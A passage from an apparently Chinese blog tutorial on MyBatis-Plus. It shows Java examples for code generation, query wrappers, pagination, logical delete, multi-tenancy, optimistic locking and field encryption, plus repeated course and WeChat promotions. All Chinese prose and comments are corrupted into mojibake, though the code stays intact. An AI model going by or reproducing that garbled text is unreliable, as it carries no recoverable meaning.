<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-9">3.1 ä»£ç ç”Ÿæˆå™¨ï¼ˆæ•ˆç‡æå‡80%ï¼‰</h4>
<p><strong>ä»¥å‰</strong>ï¼šæ‰‹åŠ¨åˆ›å»ºå®ä½“ã€Mapperã€Serviceã€Controller
<strong>ç°åœ¨</strong>ï¼šä¸€é”®ç”Ÿæˆæ‰€æœ‰æ–‡ä»¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">AutoGenerator</span> <span class="hljs-variable">generator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AutoGenerator</span>();
        
        <span class="hljs-comment">// æ•°æ®åº“é…ç½®</span>
        <span class="hljs-type">DataSourceConfig</span> <span class="hljs-variable">dataSourceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceConfig</span>();
        dataSourceConfig.setUrl(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
        dataSourceConfig.setUsername(<span class="hljs-string">"root"</span>);
        dataSourceConfig.setPassword(<span class="hljs-string">"123456"</span>);
        generator.setDataSource(dataSourceConfig);
        
        <span class="hljs-comment">// å…¨å±€é…ç½®</span>
        <span class="hljs-type">GlobalConfig</span> <span class="hljs-variable">globalConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalConfig</span>();
        globalConfig.setOutputDir(System.getProperty(<span class="hljs-string">"user.dir"</span>) + <span class="hljs-string">"/src/main/java"</span>);
        globalConfig.setAuthor(<span class="hljs-string">"å°å"</span>);
        globalConfig.setOpen(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// ç”Ÿæˆåä¸æ‰“å¼€æ–‡ä»¶å¤¹</span>
        generator.setGlobalConfig(globalConfig);
        
        <span class="hljs-comment">// åŒ…é…ç½®</span>
        <span class="hljs-type">PackageConfig</span> <span class="hljs-variable">packageConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PackageConfig</span>();
        packageConfig.setParent(<span class="hljs-string">"com.example.demo"</span>);
        packageConfig.setEntity(<span class="hljs-string">"entity"</span>);
        packageConfig.setMapper(<span class="hljs-string">"mapper"</span>);
        packageConfig.setService(<span class="hljs-string">"service"</span>);
        packageConfig.setController(<span class="hljs-string">"controller"</span>);
        generator.setPackageInfo(packageConfig);
        
        <span class="hljs-comment">// ç­–ç•¥é…ç½®</span>
        <span class="hljs-type">StrategyConfig</span> <span class="hljs-variable">strategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StrategyConfig</span>();
        strategy.setInclude(<span class="hljs-string">"user"</span>, <span class="hljs-string">"order"</span>, <span class="hljs-string">"product"</span>);  <span class="hljs-comment">// è¦ç”Ÿæˆçš„è¡¨</span>
        strategy.setNaming(NamingStrategy.underline_to_camel);  <span class="hljs-comment">// ä¸‹åˆ’çº¿è½¬é©¼å³°</span>
        strategy.setColumnNaming(NamingStrategy.underline_to_camel);
        strategy.setEntityLombokModel(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// ä½¿ç”¨Lombok</span>
        strategy.setRestControllerStyle(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// RESTé£æ ¼Controller</span>
        generator.setStrategy(strategy);
        
        <span class="hljs-comment">// æ‰§è¡Œç”Ÿæˆ</span>
        generator.execute();
    }
}
</code></pre>
<p><strong>è¿è¡Œåç”Ÿæˆ</strong>ï¼š</p>
<ul>
<li>User.javaï¼ˆå®ä½“ç±»ï¼‰</li>
<li>UserMapper.javaï¼ˆMapperæ¥å£ï¼‰</li>
<li>UserService.javaï¼ˆServiceæ¥å£ï¼‰</li>
<li>UserServiceImpl.javaï¼ˆServiceå®ç°ï¼‰</li>
<li>UserController.javaï¼ˆControllerï¼‰</li>
</ul>
<h4 data-id="heading-10">3.2 æ¡ä»¶æ„é€ å™¨ï¼ˆå‘Šåˆ«XMLï¼‰</h4>
<p><strong>ä»¥å‰</strong>ï¼šå†™ä¸€å †ifæ ‡ç­¾çš„XML
<strong>ç°åœ¨</strong>ï¼šé“¾å¼è°ƒç”¨ï¼Œå¯è¯»æ€§å¼º</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserMapper userMapper;
    
    <span class="hljs-comment">// å¤æ‚æ¡ä»¶æŸ¥è¯¢</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsers</span><span class="hljs-params">(String name, Integer minAge, Integer maxAge, Integer status)</span> {
        QueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
        
        <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(name)) {
            wrapper.like(<span class="hljs-string">"name"</span>, name);  <span class="hljs-comment">// name like '%?%'</span>
        }
        <span class="hljs-keyword">if</span> (minAge != <span class="hljs-literal">null</span>) {
            wrapper.ge(<span class="hljs-string">"age"</span>, minAge);  <span class="hljs-comment">// age &gt;= ?</span>
        }
        <span class="hljs-keyword">if</span> (maxAge != <span class="hljs-literal">null</span>) {
            wrapper.le(<span class="hljs-string">"age"</span>, maxAge);  <span class="hljs-comment">// age &lt;= ?</span>
        }
        <span class="hljs-keyword">if</span> (status != <span class="hljs-literal">null</span>) {
            wrapper.eq(<span class="hljs-string">"status"</span>, status);  <span class="hljs-comment">// status = ?</span>
        }
        
        wrapper.orderByDesc(<span class="hljs-string">"create_time"</span>);
        <span class="hljs-keyword">return</span> userMapper.selectList(wrapper);
    }
    
    <span class="hljs-comment">// æ›´ç®€æ´çš„Lambdaå†™æ³•ï¼ˆæ¨èï¼‰</span>
    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findUsersLambda</span><span class="hljs-params">(String name, Integer age)</span> {
        LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        
        wrapper.like(StringUtils.isNotBlank(name), User::getName, name)
               .eq(age != <span class="hljs-literal">null</span>, User::getAge, age)
               .orderByDesc(User::getCreateTime);
        
        <span class="hljs-keyword">return</span> userMapper.selectList(wrapper);
    }
}
</code></pre>
<h4 data-id="heading-11">3.3 åˆ†é¡µæ’ä»¶ï¼ˆä¸€è¡Œä»£ç æå®šï¼‰</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        <span class="hljs-comment">// åˆ†é¡µæ’ä»¶</span>
        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));
        <span class="hljs-keyword">return</span> interceptor;
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-keyword">public</span> Page&lt;User&gt; <span class="hljs-title function_">getUsersByPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize, String keyword)</span> {
        Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(pageNum, pageSize);
        
        LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.like(StringUtils.isNotBlank(keyword), User::getName, keyword);
        
        <span class="hljs-keyword">return</span> userMapper.selectPage(page, wrapper);
    }
}
</code></pre>
<h4 data-id="heading-12">3.4 è‡ªåŠ¨å¡«å……ï¼ˆå‡å°‘é‡å¤ä»£ç ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMetaObjectHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MetaObjectHandler</span> {
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-comment">// æ’å…¥æ—¶è‡ªåŠ¨å¡«å……</span>
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"updateTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictInsertFill(metaObject, <span class="hljs-string">"createBy"</span>, String.class, getCurrentUsername());
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFill</span><span class="hljs-params">(MetaObject metaObject)</span> {
        <span class="hljs-comment">// æ›´æ–°æ—¶è‡ªåŠ¨å¡«å……</span>
        <span class="hljs-built_in">this</span>.strictUpdateFill(metaObject, <span class="hljs-string">"updateTime"</span>, LocalDateTime.class, LocalDateTime.now());
        <span class="hljs-built_in">this</span>.strictUpdateFill(metaObject, <span class="hljs-string">"updateBy"</span>, String.class, getCurrentUsername());
    }
}
</code></pre>
<h4 data-id="heading-13">3.5 é€»è¾‘åˆ é™¤ï¼ˆæ•°æ®ä¸çœŸåˆ ï¼‰</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»å­—æ®µåŠ ä¸Šæ³¨è§£</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Integer deleted;

<span class="hljs-comment">// ä½¿ç”¨æ—¶è‡ªåŠ¨è¿‡æ»¤å·²åˆ é™¤æ•°æ®</span>
List&lt;User&gt; users = userMapper.selectList(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// åªæŸ¥ deleted=0 çš„æ•°æ®</span>

<span class="hljs-comment">// åˆ é™¤å˜æˆæ›´æ–°</span>
userMapper.deleteById(<span class="hljs-number">1L</span>);  <span class="hljs-comment">// å®é™…ä¸Šæ‰§è¡Œï¼šUPDATE user SET deleted=1 WHERE id=1</span>

<span class="hljs-comment">// æƒ³æŸ¥è¢«åˆ é™¤çš„æ•°æ®</span>
QueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
wrapper.eq(<span class="hljs-string">"deleted"</span>, <span class="hljs-number">1</span>);
List&lt;User&gt; deletedUsers = userMapper.selectList(wrapper);
</code></pre>
<h3 data-id="heading-14">å››ã€é«˜çº§åŠŸèƒ½ï¼šè§£å†³ä¸šåŠ¡ç—›ç‚¹</h3>
<h4 data-id="heading-15">4.1 å¤šç§Ÿæˆ·æ•°æ®éš”ç¦»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
        
        <span class="hljs-comment">// å¤šç§Ÿæˆ·æ’ä»¶</span>
        <span class="hljs-type">TenantLineInnerInterceptor</span> <span class="hljs-variable">tenantInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TenantLineInnerInterceptor</span>();
        tenantInterceptor.setTenantLineHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TenantLineHandler</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> Expression <span class="hljs-title function_">getTenantId</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// ä»å½“å‰ä¸Šä¸‹æ–‡ä¸­è·å–ç§Ÿæˆ·ID</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">tenantId</span> <span class="hljs-operator">=</span> TenantContext.getCurrentTenantId();
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringValue</span>(tenantId);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTenantIdColumn</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"tenant_id"</span>;  <span class="hljs-comment">// ç§Ÿæˆ·å­—æ®µå</span>
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">ignoreTable</span><span class="hljs-params">(String tableName)</span> {
                <span class="hljs-comment">// å¿½ç•¥ä¸éœ€è¦ç§Ÿæˆ·éš”ç¦»çš„è¡¨</span>
                <span class="hljs-keyword">return</span> tableName.startsWith(<span class="hljs-string">"sys_"</span>);  <span class="hljs-comment">// ç³»ç»Ÿè¡¨ä¸éš”ç¦»</span>
            }
        });
        
        interceptor.addInnerInterceptor(tenantInterceptor);
        <span class="hljs-keyword">return</span> interceptor;
    }
}
</code></pre>
<h4 data-id="heading-16">4.2 ä¹è§‚é”ï¼ˆé˜²å¹¶å‘ä¿®æ”¹ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»æ·»åŠ ç‰ˆæœ¬å­—æ®µ</span>
<span class="hljs-meta">@Version</span>
<span class="hljs-keyword">private</span> Integer version;

<span class="hljs-comment">// æ›´æ–°æ—¶è‡ªåŠ¨å¸¦ç‰ˆæœ¬å·</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.selectById(<span class="hljs-number">1L</span>);
user.setName(<span class="hljs-string">"æ–°åå­—"</span>);
userMapper.updateById(user);  <span class="hljs-comment">// è‡ªåŠ¨å¸¦ä¸Š version æ¡ä»¶</span>
<span class="hljs-comment">// SQL: UPDATE user SET name=?, version=? WHERE id=? AND version=?</span>
</code></pre>
<h4 data-id="heading-17">4.3 æšä¸¾ç±»å‹å¤„ç†</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®šä¹‰æšä¸¾</span>
<span class="hljs-meta">@Getter</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">UserStatus</span> {
    ENABLED(<span class="hljs-number">1</span>, <span class="hljs-string">"å¯ç”¨"</span>),
    DISABLED(<span class="hljs-number">0</span>, <span class="hljs-string">"ç¦ç”¨"</span>),
    LOCKED(<span class="hljs-number">2</span>, <span class="hljs-string">"é”å®š"</span>);
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Integer code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;
    
    UserStatus(Integer code, String desc) {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.desc = desc;
    }
}

<span class="hljs-comment">// å®ä½“ç±»ä½¿ç”¨</span>
<span class="hljs-meta">@TableField(value = "status", typeHandler = EnumTypeHandler.class)</span>
<span class="hljs-keyword">private</span> UserStatus status;

<span class="hljs-comment">// æŸ¥è¯¢æ—¶ç›´æ¥ä½¿ç”¨æšä¸¾</span>
LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
wrapper.eq(User::getStatus, UserStatus.ENABLED);
</code></pre>
<h4 data-id="heading-18">4.4 å­—æ®µåŠ è§£å¯†</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰TypeHandler</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncryptTypeHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;String&gt; {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Encryptor</span> <span class="hljs-variable">encryptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AESEncryptor</span>();
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, String parameter, JdbcType jdbcType)</span> {
        <span class="hljs-comment">// å­˜æ•°æ®åº“æ—¶åŠ å¯†</span>
        ps.setString(i, encryptor.encrypt(parameter));
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> {
        <span class="hljs-comment">// å–æ•°æ®æ—¶è§£å¯†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getString(columnName);
        <span class="hljs-keyword">return</span> value != <span class="hljs-literal">null</span> ? encryptor.decrypt(value) : <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// å®ä½“ç±»ä½¿ç”¨</span>
<span class="hljs-meta">@TableField(value = "phone", typeHandler = EncryptTypeHandler.class)</span>
<span class="hljs-keyword">private</span> String phone;
</code></pre>
<h3 data-id="heading-19">äº”ã€å®æˆ˜ï¼šè®¢å•ç³»ç»ŸCRUD</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-20">5.1 ä¼ ç»Ÿå†™æ³• vs MyBatis-Pluså†™æ³•</h4>
<p><strong>ä¼ ç»Ÿå†™æ³•ï¼ˆ100+è¡Œä»£ç ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderMapper.javaï¼ˆæ¥å£ï¼‰</span>
List&lt;Order&gt; <span class="hljs-title function_">findByCondition</span><span class="hljs-params">(OrderQuery query)</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">countByCondition</span><span class="hljs-params">(OrderQuery query)</span>;

<span class="hljs-comment">// OrderMapper.xmlï¼ˆXMLï¼Œ50+è¡Œï¼‰</span>
&lt;select id=<span class="hljs-string">"findByCondition"</span> resultType=<span class="hljs-string">"Order"</span>&gt;
    SELECT * FROM orders WHERE <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"userId != null"</span>&gt;<span class="hljs-type">AND</span> <span class="hljs-variable">user_id</span> <span class="hljs-operator">=</span> #{userId}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"status != null"</span>&gt;<span class="hljs-type">AND</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> #{status}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"startTime != null"</span>&gt;AND create_time &gt;= #{startTime}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"endTime != null"</span>&gt;AND create_time &lt;= #{endTime}&lt;/<span class="hljs-keyword">if</span>&gt;
    ORDER BY create_time DESC
    LIMIT #{offset}, #{limit}
&lt;/select&gt;

&lt;select id=<span class="hljs-string">"countByCondition"</span> resultType=<span class="hljs-string">"int"</span>&gt;
    SELECT <span class="hljs-title function_">COUNT</span><span class="hljs-params">(*)</span> FROM orders WHERE <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
    &lt;!-- é‡å¤ä¸€éæ¡ä»¶åˆ¤æ–­ --&gt;
&lt;/select&gt;

<span class="hljs-comment">// OrderService.javaï¼ˆä¸šåŠ¡é€»è¾‘ï¼Œ30+è¡Œï¼‰</span>
<span class="hljs-keyword">public</span> PageResult&lt;Order&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(OrderQuery query)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> orderMapper.countByCondition(query);
    List&lt;Order&gt; list = orderMapper.findByCondition(query);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageResult</span>&lt;&gt;(total, list);
}
</code></pre>
<p><strong>MyBatis-Pluså†™æ³•ï¼ˆ20è¡Œä»£ç ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-keyword">public</span> Page&lt;Order&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(OrderQuery query)</span> {
        <span class="hljs-comment">// æ„é€ æŸ¥è¯¢æ¡ä»¶</span>
        LambdaQueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.eq(query.getUserId() != <span class="hljs-literal">null</span>, Order::getUserId, query.getUserId())
               .eq(query.getStatus() != <span class="hljs-literal">null</span>, Order::getStatus, query.getStatus())
               .ge(query.getStartTime() != <span class="hljs-literal">null</span>, Order::getCreateTime, query.getStartTime())
               .le(query.getEndTime() != <span class="hljs-literal">null</span>, Order::getCreateTime, query.getEndTime())
               .orderByDesc(Order::getCreateTime);
        
        <span class="hljs-comment">// åˆ†é¡µæŸ¥è¯¢ï¼ˆè‡ªåŠ¨ç»Ÿè®¡æ€»æ•°ï¼‰</span>
        Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(query.getPageNum(), query.getPageSize());
        <span class="hljs-keyword">return</span> orderMapper.selectPage(page, wrapper);
    }
    
    <span class="hljs-comment">// ç»Ÿè®¡å„çŠ¶æ€è®¢å•æ•°é‡</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Long&gt; <span class="hljs-title function_">countByStatus</span><span class="hljs-params">()</span> {
        QueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
        wrapper.select(<span class="hljs-string">"status, COUNT(*) as count"</span>)
               .groupBy(<span class="hljs-string">"status"</span>);
        
        List&lt;Map&lt;String, Object&gt;&gt; list = orderMapper.selectMaps(wrapper);
        <span class="hljs-comment">// è½¬æ¢ç»“æœ...</span>
    }
}
</code></pre>
<h4 data-id="heading-21">5.2 å¤æ‚æŸ¥è¯¢ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. è”è¡¨æŸ¥è¯¢</span>
<span class="hljs-keyword">public</span> List&lt;OrderVO&gt; <span class="hljs-title function_">getOrderWithUser</span><span class="hljs-params">(Long userId)</span> {
    QueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
    wrapper.select(<span class="hljs-string">"o.*, u.name as userName"</span>)
           .eq(<span class="hljs-string">"o.user_id"</span>, userId)
           .eq(<span class="hljs-string">"o.deleted"</span>, <span class="hljs-number">0</span>)
           .orderByDesc(<span class="hljs-string">"o.create_time"</span>);
    
    <span class="hljs-keyword">return</span> orderMapper.selectOrderWithUser(wrapper);
}

<span class="hljs-comment">// è‡ªå®šä¹‰Mapperæ–¹æ³•</span>
<span class="hljs-meta">@Select("SELECT o.*, u.name as userName FROM orders o " +
        "LEFT JOIN user u ON o.user_id = u.id " +
        "${ew.customSqlSegment}")</span>  <span class="hljs-comment">// ä½¿ç”¨Wrapperæ¡ä»¶</span>
List&lt;OrderVO&gt; <span class="hljs-title function_">selectOrderWithUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(Constants.WRAPPER)</span> QueryWrapper&lt;Order&gt; wrapper)</span>;

<span class="hljs-comment">// 2. æ‰¹é‡æ“ä½œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchUpdateStatus</span><span class="hljs-params">(List&lt;Long&gt; orderIds, Integer status)</span> {
    UpdateWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;&gt;();
    wrapper.in(<span class="hljs-string">"id"</span>, orderIds)
           .set(<span class="hljs-string">"status"</span>, status)
           .set(<span class="hljs-string">"update_time"</span>, LocalDateTime.now());
    
    orderMapper.update(<span class="hljs-literal">null</span>, wrapper);  <span class="hljs-comment">// æ‰¹é‡æ›´æ–°</span>
}

